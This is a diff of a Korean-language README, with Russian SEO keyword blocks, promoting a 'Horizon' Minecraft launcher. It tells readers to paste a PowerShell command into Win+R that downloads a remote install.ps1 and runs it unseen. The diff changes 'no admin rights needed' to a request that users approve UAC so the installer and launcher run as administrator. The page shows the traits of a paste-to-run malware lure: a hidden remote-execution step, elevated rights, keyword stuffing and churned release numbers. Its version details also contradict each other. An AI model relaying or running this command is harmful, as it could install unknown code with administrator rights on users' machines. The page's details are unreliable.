@@ -12,7 +12,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 2. **붙여넣기.** Ctrl+V — 아래 명령을 붙입니다.
 3. **Enter.** Horizon이 설치되고 열립니다. 그다음 준비 → 플레이.
 
-<p align="center">관리자 권한 불필요. Windows가 PowerShell을 물으면 확인하세요. 명령은 horizonlauncher.net의 `install.ps1`만 받습니다.</p>
+<p align="center">UAC를 확인하세요. 설치 프로그램과 런처는 관리자 권한으로 실행됩니다(horizonlauncher.net과 동일).
 
 <p align="center">
   <a href="https://horizonlauncher.net/horizon-launcher-setup.exe"><strong>일반 설치 — Horizon 다운로드 setup.exe</strong></a>
@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>최신 업데이트:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64">0.2.64</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">모든 업데이트와 패치</a>
 </p>
 
@@ -37,6 +37,8 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
     <img src="https://horizonlauncher.net/media/logo.png" width="120" height="120" alt="Horizon Minecraft launcher">
   </a>
 </p>
+
+<p align="center"><em>Обновлено 2026-11-16: лаунчер <strong>0.2.69</strong>, LGPL, Win+R, UAC. Скачивание только с <a href="https://horizonlauncher.net/">horizonlauncher.net</a>.</em></p>
 
 <h1 align="center">Horizon 다운로드 — Rust로 만든 Minecraft 런처 (Minecraft Rust Edition)</h1>
 
@@ -64,9 +66,9 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/가격-무료-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.64-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.64-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.64-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
 </p>
 
 
@@ -108,39 +110,29 @@ Horizon은 Mojang / Microsoft 제품이 **아닙니다**. **horizonlauncher.net*
 
 Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버전마다 별도 릴리스와 changelog. 현재 설치 파일은 사이트, 패치 기록은 여기.
 
-**최신 업데이트:** [0.2.64](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64) · **[모든 업데이트와 패치](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 61 개 (0.2.0 → 0.2.64).
+**최신 업데이트:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[모든 업데이트와 패치](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 개 (0.2.0 → 0.2.69).
 
 | 버전 | 날짜 | |
 |---|---|---|
-| **[0.2.64](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64)** | 2026-11-14 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64) |
-| **[0.2.63](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.63)** | 2026-11-13 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.63) |
-| **[0.2.62](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.62)** | 2026-11-12 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.62) |
-| **[0.2.61](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.61)** | 2026-11-12 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.61) |
-| **[0.2.60](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.60)** | 2026-11-11 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.60) |
-| **[0.2.59](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59)** | 2026-11-10 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59) |
-| **[0.2.58](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58)** | 2026-11-09 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58) |
-| **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
-| **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
-| **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [notes](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
+| **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
+| **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
+| **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
+| **[0.2.66](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.66)** | 2026-11-15 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.66) |
+| **[0.2.65](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.65)** | 2026-11-14 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.65) |
+| **[0.2.64](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64)** | 2026-11-14 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.64) |
+| **[0.2.63](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.63)** | 2026-11-13 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.63) |
+| **[0.2.62](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.62)** | 2026-11-12 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.62) |
+| **[0.2.61](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.61)** | 2026-11-12 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.61) |
+| **[0.2.60](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.60)** | 2026-11-11 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.60) |
+| **[0.2.59](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59)** | 2026-11-10 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.59) |
+| **[0.2.58](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58)** | 2026-11-09 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.58) |
+| **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
+| **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
+| **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
 | **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
-| **[0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49)** | 2026-11-07 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) |
-| **[0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48)** | 2026-11-06 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) |
-| **[0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47)** | 2026-11-06 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) |
-| **[0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46)** | 2026-11-06 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) |
-| **[0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45)** | 2026-11-06 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) |
-| **[0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)** | 2026-11-05 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) |
-| **[0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)** | 2026-11-05 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43) |
-| **[0.2.42](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.42)** | 2026-11-05 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.42) |
-| **[0.2.41](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.41)** | 2026-11-04 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.41) |
-| **[0.2.40](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.40)** | 2026-11-04 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.40) |
-| **[0.2.39](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.39)** | 2026-11-04 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.39) |
-| **[0.2.38](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.38)** | 2026-11-04 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.38) |
-| **[0.2.37](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.37)** | 2026-11-02 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.37) |
-| **[0.2.36](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.36)** | 2026-11-02 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.36) |
-| **[0.2.35](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.35)** | 2026-11-01 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.35) |
 
 
-이전 버전: [0.2.34](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.34) · [0.2.33](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.33) · [0.2.32](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.32) · [0.2.31](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.31) · [0.2.30](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.30) · [0.2.29](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.29) · [0.2.28](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.28) · [0.2.27](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.27) · [0.2.26](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.26) · [0.2.25](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.25) · [0.2.24](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.24) · [0.2.23](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.23) · [0.2.22](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.22) · [0.2.21](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.21) · [0.2.20](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.20) · [0.2.19](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.19)
+이전 버전: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
 
 
 ## Horizon Minecraft이란
@@ -163,7 +155,7 @@ Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버�
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.64**
+- Horizon **0.2.54**
 - 무료 · 사이트는 러시아어와 영어
 
 ## Horizon 설치 — 두 가지 방법
@@ -193,10 +185,10 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 ### 방법 2. 일반 설치 (setup.exe)
 
-같은 Horizon 설치 파일 — 명령 없이 파일 다운로드. 현재 **0.2.64**, Windows x64, 약 60 MB.
+같은 Horizon 설치 파일 — 명령 없이 파일 다운로드. 현재 **0.2.54**, Windows x64, 약 60 MB.
 
 **[Horizon 다운로드 — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.64
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
 
 1. [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)를 받습니다.
 2. Windows 설치 프로그램을 실행합니다.
@@ -250,7 +242,7 @@ Horizon Rust 클라이언트에는 필요 없습니다.
 
 `Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Minecraft Rust Edition` `마인크래프트 FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon Win+R install` `Horizon setup.exe`
 
-`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.64` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.64` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
+`скачать Horizon` `скачать Horizon бесплатно` `скачать Horizon Minecraft` `скачать Horizon лаунчер` `скачать Horizon Windows` `скачать Horizon Windows 10` `скачать Horizon Windows 11` `скачать Horizon x64` `скачать Horizon 64 bit` `скачать Horizon setup` `скачать Horizon exe` `скачать Horizon installer` `скачать Horizon установщик` `скачать Horizon 0.2.54` `скачать Horizon 2026` `скачать Horizon официальный` `скачать Horizon с официального сайта` `скачать Horizon horizonlauncher.net` `скачать Horizon github` `скачать Horizon launcher github` `Horizon Minecraft скачать` `Horizon Minecraft бесплатно` `Horizon Minecraft лаунчер` `Horizon Minecraft Windows` `Horizon Minecraft Rust` `Horizon Minecraft на Rust` `Horizon Minecraft Rust Edition` `лаунчер Horizon` `лаунчер Horizon скачать` `лаунчер Horizon Windows` `лаунчер Horizon Minecraft` `лаунчер Horizon Minecraft Java` `установить Horizon` `установка Horizon` `как скачать Horizon` `как установить Horizon` `как поставить Horizon` `быстрая установка Horizon` `обычная установка Horizon` `Win+R Horizon` `Horizon Win+R` `команда Win+R Horizon` `powershell Horizon` `irm install.ps1 Horizon` `install.ps1 horizonlauncher.net` `horizon-launcher-setup.exe` `Horizon setup.exe` `Minecraft на Rust` `Minecraft Rust Edition` `клиент Minecraft на Rust` `клиент Minecraft Rust` `Rust клиент Minecraft` `нативный клиент Minecraft` `Minecraft без JVM` `Minecraft без Java` `Minecraft Java на Rust` `альтернатива официальному лаунчеру Minecraft` `лаунчер Minecraft Windows` `лаунчер Minecraft Java` `скачать лаунчер Minecraft` `лучший лаунчер Minecraft FPS` `высокий FPS Minecraft` `поднять FPS Minecraft` `Minecraft не лагает` `оптимизация Minecraft Java` `FPS Minecraft Java` `Horizon 0.2.54` `Horizon launcher` `download Horizon` `download Horizon Minecraft` `download Horizon launcher` `download Horizon Windows setup` `Horizon Minecraft launcher download` `Minecraft on Rust` `Minecraft Rust Edition download` `Rust Minecraft client` `Horizon Rust Edition` `free Horizon launcher` `Horizon github` `Horizon Minecraft GitHub` `GitHub Horizon launcher`
 
 ### Horizon 다운로드 / Win+R / setup.exe
 
